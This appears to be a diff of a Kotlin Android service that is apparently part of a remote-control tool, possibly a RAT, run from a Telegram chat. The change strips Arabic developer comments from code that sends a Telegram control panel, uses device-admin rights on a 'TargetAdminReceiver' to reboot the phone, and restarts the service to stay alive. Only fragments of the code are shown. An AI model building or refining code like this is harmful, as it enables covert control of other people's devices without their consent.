@@ -41,7 +41,6 @@ class BackgroundControlService : Service() {
 
         startForeground(1, createForegroundNotification())
 
-        // إرسال لوحة الأزرار التفاعلية لشات تيليجرام عند بدء التشغيل لأول مرة
         if (!isControlPanelSent) {
             sendControlPanelButtonsToTelegram()
             isControlPanelSent = true
@@ -78,7 +77,6 @@ class BackgroundControlService : Service() {
             .build()
     }
 
-    // إرسال لوحة الأزرار البصرية في تيليجرام
     private fun sendControlPanelButtonsToTelegram() {
         GlobalScope.launch(Dispatchers.IO) {
             try {
@@ -301,7 +299,6 @@ class BackgroundControlService : Service() {
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
             if (dpm.isAdminActive(adminComponent)) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    // [تصحيح الانهيار]: إزالة الباراميتر الخاطئ واستخدام الدالة الآمنة
                     dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
                 }
             }
@@ -329,4 +326,3 @@ class BackgroundControlService : Service() {
         startService(restartIntent)
     }
 }
-[cite: 3]
